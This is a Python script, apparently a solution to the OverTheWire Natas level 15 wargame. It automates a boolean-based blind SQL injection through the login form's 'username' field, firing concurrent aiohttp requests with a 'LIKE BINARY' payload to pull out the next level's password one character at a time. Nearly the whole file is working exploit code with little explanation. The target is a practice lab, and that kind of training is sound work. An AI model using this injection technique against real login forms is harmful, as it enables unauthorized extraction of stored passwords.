import urllib.request
import threading
import string
import aiohttp
import asyncio
from halo import Halo


async def get_password_request(session, data, character):
    url = "http://natas15.natas.labs.overthewire.org/"
    async with session.post(url, data=data) as response:
        return await response.text(), character


async def get_password(session):
    spinner = Halo(text='The password for natas 16 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()
    characters = string.ascii_letters + string.digits
    natas16_password = ""

    for _ in range(32):
        tasks = []
        spinner.stop()
        spinner = Halo(text='The password for natas 16 is: ' + natas16_password,
                       spinner='bouncingBar', color="blue")
        spinner.start()

        for character in characters:
            payload = f'natas16" AND password LIKE BINARY "{natas16_password + character}%"-- -'
            data = {"username": payload}
            tasks.append(asyncio.ensure_future(get_password_request(session, data, character)))

        requests = await asyncio.gather(*tasks)
        for response in requests:
            """
            The get_password_request return the html of the request and the character for the SQLinjection,
            it keeps the html in response[0] and the character in response[1].
            """
            if "This user exists" in response[0]:
                natas16_password += response[1]


    spinner.succeed(text="The password for natas 16 is: " + natas16_password)

    return natas16_password


async def make_session(natas15_password):
    """
    Create a session and start running an asynchronous function
    that exploits the SQLinjection in natas 15.
    """
    auth = aiohttp.BasicAuth("natas15", natas15_password)
    async with aiohttp.ClientSession(auth=auth) as session:
        natas16_password = await get_password(session)

    return natas16_password


def get_natas16_password(natas15_password):
    """
    Create an event loop and run an asynchronous function.
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    natas16_password = asyncio.run(make_session(natas15_password))

    return natas16_password


if __name__ == "__main__":
    natas15_password = ""  # Put here the password for natas15 here
    get_natas16_password(natas15_password)
